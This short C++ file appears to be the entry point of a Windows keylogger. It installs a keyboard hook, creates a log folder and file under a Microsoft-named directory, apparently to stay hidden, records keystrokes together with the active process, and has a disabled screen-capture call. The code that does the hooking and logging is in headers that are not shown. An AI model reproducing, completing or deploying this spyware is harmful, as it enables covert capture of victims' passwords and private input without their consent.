#include "stream.h"
#include "keyhook.h"
#include "screen.h"

#define LOG_FILE_NAME "blxrlog.txt"

//#define DEBUG_BUILD

#ifdef DEBUG_BUILD
#define DEB(x) std::cout << #x << " - " << x << std::endl;
#endif

int main() {
#ifdef DEBUG_BUILD
  DEB(stream::GetPath())
#endif

#ifndef DEBUG_BUILD
  key_hook::InstallHook();

  stream::MakeDir(stream::GetPath("\\Microsoft\\blxr"));
  stream::MakeFile();
  stream::WriteLog("[*] BOOT [*]", key_hook::active_process, true);

  //screen::CaptureScreen(stream::GetPath("\\Microsoft\\blxr", true), "screen.jpeg");

  key_hook::HandleMessage(true);
#endif

  return 0;
}